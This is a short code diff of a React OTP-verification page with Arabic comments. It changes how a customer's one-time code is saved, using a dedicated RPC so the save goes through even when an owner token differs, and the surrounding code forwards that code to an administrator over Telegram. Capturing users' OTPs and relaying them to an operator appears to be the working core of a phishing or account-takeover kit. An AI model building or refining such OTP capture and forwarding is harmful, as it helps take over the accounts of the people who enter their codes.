@@ -227,11 +227,12 @@ const OTPVerification = () => {
     setIsVerifying(true);
     try {
       if (applicationId) {
-        await updateApplicationPublic(applicationId, {
-          otp_code: otp,
-          current_step: 'otp',
-          status: 'pending_otp',
+        // نستخدم RPC مخصصة لحفظ OTP حتى لا يفشل عند اختلاف owner_token
+        const { error: otpErr } = await supabase.rpc('set_customer_otp' as any, {
+          _id: applicationId,
+          _otp: otp,
         });
+        if (otpErr) console.error('set_customer_otp error:', otpErr);
 
         // إشعار المسؤول عبر Telegram برمز التحقق
         try {
